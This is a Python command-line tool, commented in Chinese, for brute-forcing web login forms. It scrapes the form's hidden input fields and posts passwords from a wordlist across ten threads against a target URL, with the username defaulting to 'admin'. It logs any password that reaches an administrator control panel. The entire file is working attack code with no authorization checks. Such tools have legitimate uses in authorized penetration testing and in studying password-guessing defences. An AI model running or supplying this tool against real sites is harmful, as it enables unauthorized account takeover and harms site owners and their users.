import threading
import queue
import requests
import argparse
import logging
from html.parser import HTMLParser

# 配置日志，记录爆破过程中的信息和错误
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 默认线程数
USER_THREAD = 10

# 登录成功标志
SUCCESS_CHECK = 'Administrator - Control Panel'

# 表单字段名
USERNAME_FIELD = 'username'
PASSWORD_FIELD = 'password'

class BruteParser(HTMLParser):
    """
    HTML 解析器，用于提取表单中的 input 字段
    """
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        """
        处理 <input> 标签，提取 name 和 value 属性
        """
        if tag == "input":
            tag_name = None
            tag_value = ""
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value or ""
            if tag_name:
                self.tag_results[tag_name] = tag_value

class Bruter(object):
    """
    暴力破解类，尝试使用用户名和密码词典进行登录
    """
    def __init__(self, username, words, target_url, target_post):
        """
        初始化 Bruter 对象
        :param username: 用户名
        :param words: 密码词典队列
        :param target_url: 登录页面 URL
        :param target_post: 表单提交 URL
        """
        self.username = username
        self.password_q = words
        self.target_url = target_url
        self.target_post = target_post
        self.found = False
        self.lock = threading.Lock()  # 线程锁，确保 found 的线程安全性
        logging.info("为用户 %s 初始化完成", username)

    def run_bruteforce(self):
        """
        启动多线程暴力破解
        """
        threads = []
        for i in range(USER_THREAD):
            t = threading.Thread(target=self.web_bruter)
            t.start()
            threads.append(t)
        
        # 等待所有线程完成
        for t in threads:
            t.join()

    def web_bruter(self):
        """
        执行单个线程的暴力破解逻辑
        """
        session = requests.Session()  # 使用 Session 保持 Cookie
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            try:
                # 获取登录页面
                response = session.get(self.target_url, timeout=5)
                response.raise_for_status()
                page = response.text

                # 解析表单字段
                parser = BruteParser()
                parser.feed(page)
                post_tags = parser.tag_results

                # 设置用户名和密码
                post_tags[USERNAME_FIELD] = self.username
                post_tags[PASSWORD_FIELD] = brute

                # 发送登录请求
                login_response = session.post(self.target_post, data=post_tags, timeout=5)
                login_response.raise_for_status()
                login_result = login_response.text

                # 记录尝试
                logging.info("尝试: %s : %s (%d 剩余)", self.username, brute, self.password_q.qsize())

                # 检查是否登录成功
                if SUCCESS_CHECK in login_result:
                    with self.lock:
                        if not self.found:
                            self.found = True
                            logging.info("[*] 暴力破解成功")
                            logging.info("[*] 用户名: %s", self.username)
                            logging.info("[*] 密码: %s", brute)
                            logging.info("[*] 等待其他线程退出...")

            except requests.RequestException as e:
                logging.warning("尝试 %s : %s 失败: %s", self.username, brute, str(e))
                continue

def build_wordlist(wordlist_file, resume=None):
    """
    构建词典队列，从文件中读取密码并存入队列
    :param wordlist_file: 词典文件路径
    :param resume: 恢复爆破的起始词（可选）
    :return: 包含密码的队列
    """
    words = queue.Queue()
    try:
        with open(wordlist_file, "r", encoding="utf-8") as fd:
            raw_words = fd.readlines()
        
        found_resume = False
        for word in raw_words:
            word = word.rstrip()
            if resume:
                if found_resume:
                    words.put(word)
                else:
                    if word == resume:
                        found_resume = True
                        logging.info("从 %s 恢复词典", resume)
            else:
                words.put(word)
    except FileNotFoundError:
        logging.error("词典文件 %s 不存在", wordlist_file)
        exit(1)
    except UnicodeDecodeError:
        logging.error("词典文件编码错误，请确保文件为 UTF-8 编码")
        exit(1)
    
    return words

def main():
    """
    主函数，解析命令行参数并启动暴力破解
    """
    parser = argparse.ArgumentParser(description="Web 登录表单暴力破解工具")
    parser.add_argument("-u", "--url", required=True, help="登录页面 URL")
    parser.add_argument("-p", "--post", required=True, help="表单提交 URL")
    parser.add_argument("-w", "--wordlist", required=True, help="密码词典文件路径")
    parser.add_argument("-n", "--username", default="admin", help="用户名（默认: admin）")
    parser.add_argument("-t", "--threads", type=int, default=USER_THREAD, help="线程数（默认: 10）")
    parser.add_argument("-r", "--resume", help="从指定密码恢复爆破")
    args = parser.parse_args()

    # 验证 URL
    if not args.url.startswith("http"):
        args.url = f"http://{args.url}"
    if not args.post.startswith("http"):
        args.post = f"http://{args.post}"
    logging.info("登录页面: %s", args.url)
    logging.info("提交 URL: %s", args.post)

    # 构建词典队列
    words = build_wordlist(args.wordlist, args.resume)
    logging.info("词典加载完成，密码数: %d", words.qsize())

    # 启动暴力破解
    bruter_obj = Bruter(args.username, words, args.url, args.post)
    bruter_obj.run_bruteforce()

if __name__ == "__main__":
    main()